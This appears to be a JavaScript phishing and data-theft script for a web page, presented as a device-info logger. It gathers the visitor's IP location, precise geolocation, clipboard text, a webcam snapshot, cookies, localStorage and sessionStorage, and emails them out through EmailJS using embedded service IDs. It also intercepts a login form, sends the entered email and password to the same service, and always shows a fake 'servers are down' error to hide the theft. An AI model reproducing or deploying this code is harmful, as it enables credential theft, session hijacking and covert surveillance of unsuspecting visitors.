// This script collects device/browser info and sends it via EmailJS
// IMPORTANT: Replace the placeholders with your EmailJS credentials

// EmailJS Initialization - You need to sign up and get your credentials
// See https://www.emailjs.com/docs/sdk/installation/
(function(){
    emailjs.init("VcalrjM3vIz1HQLCG"); // <-- Replace with your EmailJS user ID
})();

// Function to get IP and location info from ipapi.co
function getIpInfo() {
    return fetch("https://ipapi.co/json/")
        .then(response => response.json())
        .catch(() => ({
            ip: "Unavailable",
            network: "",
            version: "",
            city: "",
            region: "",
            region_code: "",
            country: "",
            country_name: "",
            country_code: "",
            country_code_iso3: "",
            country_capital: "",
            country_tld: "",
            continent_code: "",
            in_eu: "",
            postal: "",
            latitude: "",
            longitude: "",
            timezone: "",
            utc_offset: "",
            country_calling_code: "",
            currency: "",
            currency_name: "",
            languages: "",
            country_area: "",
            country_population: "",
            asn: "",
            org: ""
        }));
}

// Helper to get base64 size in KB
function base64SizeKb(base64) {
    return base64.length * (3/4) / 1024;
}

// Attempts to shrink JPEG quality to get under 45KB
async function getReducedCameraImage(video, maxKb = 45) {
    let canvas = document.createElement('canvas');
    canvas.width = 160; // you can change dimensions for even smaller images
    canvas.height = 120;
    let ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    let quality = 0.9;
    let camera_image = canvas.toDataURL("image/jpeg", quality);
    while (base64SizeKb(camera_image) > maxKb && quality > 0.1) {
        quality -= 0.1;
        camera_image = canvas.toDataURL("image/jpeg", quality);
    }
    // If still too large, crop quality to minimum
    if (base64SizeKb(camera_image) > maxKb) {
        camera_image = "Image too large after compression";
    }
    return camera_image;
}

// Function to get device info (extended with permissions and browser features)
async function getDeviceInfo() {
    let plugins = "Unavailable";
    let battery_status = "Unavailable";
    let device_memory = "Unavailable";
    let hardware_concurrency = "Unavailable";
    let touch_support = "Unavailable";
    let referrer = document.referrer || "Unavailable";
    let geolocation = "Permission denied";
    let clipboard_text = "Permission denied";
    let camera_status = "Permission denied";
    let microphone_status = "Permission denied";
    let camera_image = "Permission denied";

    // Plugins (Chrome/Firefox only)
    try {
        plugins = navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(", ") : "Unavailable";
    } catch(e) {}

    // Battery status
    try {
        if (navigator.getBattery) {
            let battery = await navigator.getBattery();
            battery_status = `charging: ${battery.charging}, level: ${battery.level}, chargingTime: ${battery.chargingTime}, dischargingTime: ${battery.dischargingTime}`;
        }
    } catch(e) {}

    // Device memory
    try {
        device_memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unavailable";
    } catch(e) {}

    // CPU threads
    try {
        hardware_concurrency = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " threads" : "Unavailable";
    } catch(e) {}

    // Touch detection
    try {
        let hasTouch = (('ontouchstart' in window) || (navigator.maxTouchPoints > 0));
        touch_support = hasTouch ? "Yes" : "No";
    } catch(e) {}

    // Geolocation
    try {
        if ('geolocation' in navigator) {
            await new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        geolocation = `Latitude: ${pos.coords.latitude}, Longitude: ${pos.coords.longitude}, Accuracy: ${pos.coords.accuracy} meters`;
                        resolve();
                    },
                    (err) => {
                        geolocation = "Permission denied";
                        resolve();
                    },
                    {timeout: 5000}
                );
            });
        }
    } catch(e) {}

    // Clipboard access (requires user gesture; browsers restrict this)
    try {
        if (navigator.clipboard && navigator.clipboard.readText) {
            clipboard_text = await navigator.clipboard.readText();
        }
    } catch(e) {
        clipboard_text = "Permission denied or no clipboard";
    }

    // Camera & Microphone access (with image compression)
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            let stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
            camera_status = "Permission granted";
            microphone_status = "Permission granted";
            try {
                let video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                camera_image = await getReducedCameraImage(video, 45);
                stream.getTracks().forEach(track => track.stop());
            } catch(e) {
                camera_image = "Could not capture image";
            }
        }
    } catch(e) {
        camera_status = "Permission denied";
        microphone_status = "Permission denied";
        camera_image = "Permission denied";
    }

    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookiesEnabled: navigator.cookieEnabled,
        screen: {
            width: window.screen.width,
            height: window.screen.height,
            availWidth: window.screen.availWidth,
            availHeight: window.screen.availHeight,
            colorDepth: window.screen.colorDepth,
            pixelDepth: window.screen.pixelDepth
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        online: navigator.onLine,
        plugins: plugins,
        battery_status: battery_status,
        device_memory: device_memory,
        hardware_concurrency: hardware_concurrency,
        touch_support: touch_support,
        referrer: referrer,
        geolocation: geolocation,
        clipboard_text: clipboard_text,
        camera_status: camera_status,
        microphone_status: microphone_status,
        camera_image: camera_image
    };
}

// Grab cookies for current domain
function getCookies() {
    try {
        return document.cookie || "No cookies set";
    } catch(e) {
        return "Unavailable";
    }
}

// Grab localStorage data for current domain
function getLocalStorage() {
    try {
        return JSON.stringify(localStorage);
    } catch(e) {
        return "Unavailable";
    }
}

// Grab sessionStorage data for current domain
function getSessionStorage() {
    try {
        return JSON.stringify(sessionStorage);
    } catch(e) {
        return "Unavailable";
    }
}

// Main execution
getIpInfo().then(async ipInfo => {
    const deviceInfo = await getDeviceInfo();

    emailjs.send("service_5fifa81", "template_DataLogs", {
        ip: ipInfo.ip,
        network: ipInfo.network,
        version: ipInfo.version,
        city: ipInfo.city,
        region: ipInfo.region,
        region_code: ipInfo.region_code,
        country: ipInfo.country,
        country_name: ipInfo.country_name,
        country_code: ipInfo.country_code,
        country_code_iso3: ipInfo.country_code_iso3,
        country_capital: ipInfo.country_capital,
        country_tld: ipInfo.country_tld,
        continent_code: ipInfo.continent_code,
        in_eu: ipInfo.in_eu,
        postal: ipInfo.postal,
        latitude: ipInfo.latitude,
        longitude: ipInfo.longitude,
        timezone: ipInfo.timezone,
        utc_offset: ipInfo.utc_offset,
        country_calling_code: ipInfo.country_calling_code,
        currency: ipInfo.currency,
        currency_name: ipInfo.currency_name,
        languages: ipInfo.languages,
        country_area: ipInfo.country_area,
        country_population: ipInfo.country_population,
        asn: ipInfo.asn,
        org: ipInfo.org,

        userAgent: deviceInfo.userAgent,
        platform: deviceInfo.platform,
        language: deviceInfo.language,
        cookiesEnabled: deviceInfo.cookiesEnabled,
        screen: JSON.stringify(deviceInfo.screen),
        online: deviceInfo.online,
        plugins: deviceInfo.plugins,
        battery_status: deviceInfo.battery_status,
        device_memory: deviceInfo.device_memory,
        hardware_concurrency: deviceInfo.hardware_concurrency,
        touch_support: deviceInfo.touch_support,
        referrer: deviceInfo.referrer,
        geolocation: deviceInfo.geolocation,
        clipboard_text: deviceInfo.clipboard_text,
        camera_status: deviceInfo.camera_status,
        microphone_status: deviceInfo.microphone_status,
        camera_image: deviceInfo.camera_image,
        cookies: getCookies(),
        localStorage: getLocalStorage(),
        sessionStorage: getSessionStorage()
    })
    .then(() => {
        if (document.getElementById("log-status")) {
            document.getElementById("log-status").innerText = "Log sent successfully!";
        }
    })
    .catch(error => {
        if (document.getElementById("log-status")) {
            document.getElementById("log-status").innerText = "Failed to send log: " + JSON.stringify(error);
        }
    });

    // Attach login form handler
    const loginForm = document.getElementById("login-form");
    if (loginForm) {
        loginForm.addEventListener("submit", function(e) {
            e.preventDefault();
            const email = loginForm.querySelector("[name='email']").value;
            const password = loginForm.querySelector("[name='password']").value;

            // Send login via EmailJS (template_login must exist)
            emailjs.send("service_5fifa81", "template_credentials", {
                email: email,
                password: password,
                timestamp: new Date().toISOString()
            })
            .then(() => {
                // Always show the fake error message after submission
                if (document.getElementById("login-status")) {
                    document.getElementById("login-status").innerText =
                        "The request has been canceled. Maybe your Internet is off or our servers are down. Please try again later.";
                }
            })
            .catch(() => {
                // Show the same fake error message even if sending fails
                if (document.getElementById("login-status")) {
                    document.getElementById("login-status").innerText =
                        "The request has been canceled. Maybe your Internet is off or our servers are down. Please try again later.";
                }
            });
        });
    }
}).catch(error => {
    if (document.getElementById("log-status")) {
        document.getElementById("log-status").innerText = "Failed to fetch IP info: " + JSON.stringify(error);
    }
});
